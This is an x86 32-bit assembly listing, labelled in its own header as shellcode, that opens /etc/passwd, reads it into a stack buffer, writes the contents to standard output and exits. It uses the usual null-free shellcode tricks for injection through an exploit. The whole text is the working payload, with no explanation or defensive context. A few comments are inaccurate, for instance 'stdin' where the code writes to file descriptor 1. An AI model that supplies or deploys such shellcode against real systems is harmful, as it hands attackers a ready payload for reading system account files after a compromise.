; open read write shellcode /etc/passwd X86_32
[SECTION .text]

global _start

_start:

    ; open //etc/passwd

    xor eax, eax        ; clear EAX
    push eax            ; push NULL byte   
    mov al, 0x5         ; open syscall
    push 0x64777373     ; //etc/passwd
    push 0x61702f2f
    push 0x6374652f
    mov ebx, esp        ; EBX ptr to //etc/passwd
    xor ecx, ecx        ; int flags 
    xor edx, edx        ; int mode
    int 0x80            ; syscall open

    ; read //etc/passwd

    xchg ebx, eax       ; get file descriptor
    xor eax, eax        ; clear EAX
    mov al, 0x3         ; read syscall
    lea ecx, [esp]      ; buffer
    xor edx, edx        ; clear EDX
    add dx, 0xffff       ; size to read
    int 0x80            ; syscall read

    ; write stdin   

    xchg eax, edx       ; EDX size read
    xor eax, eax        ; clear 
    mov al, 0x4         ; write syscall
    xor ebx, ebx        ; clear EBX
    mov bl, 0x1         ; stdin
                        ; ECX = buffer still
    int 0x80            ; syscall write

    xor eax, eax        ; clear EAX
    mov al, 0x1         ; exit syscall
    xor ebx, ebx        ; exit 0
    int 0x80            ; syscall exit
